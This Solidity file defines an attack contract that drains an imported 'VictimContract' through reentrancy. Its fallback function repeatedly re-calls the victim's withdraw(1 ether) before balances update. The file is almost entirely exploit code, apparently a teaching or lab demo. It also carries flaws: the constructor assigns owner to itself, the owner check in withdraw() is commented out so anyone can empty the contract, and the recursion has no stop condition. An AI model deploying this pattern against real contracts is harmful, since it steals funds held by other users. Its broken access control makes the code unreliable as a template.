pragma solidity 0.5.0;

import "./VictimContract.sol";

contract AttackContract {
    VictimContract public victim;
    uint256 public counter;
    address owner;

    constructor(address _owner, address payable _victim) public {
        owner = owner;
        victim = VictimContract(_victim);
    }

    function() external payable {
        counter++;
        attack();
    }

    function attack() public payable {
        victim.withdraw(1 ether);
    }

    function deposit() public {
        address(victim).call.value(1 ether)("");
    }

    function fund() public payable {}

    function withdraw() public payable {
        // require(msg.sender == owner, "not the owner of the contract");
        msg.sender.call.value(address(this).balance)("");
    }

    function balanceOf() public view returns (uint256) {
        return address(this).balance;
    }
}
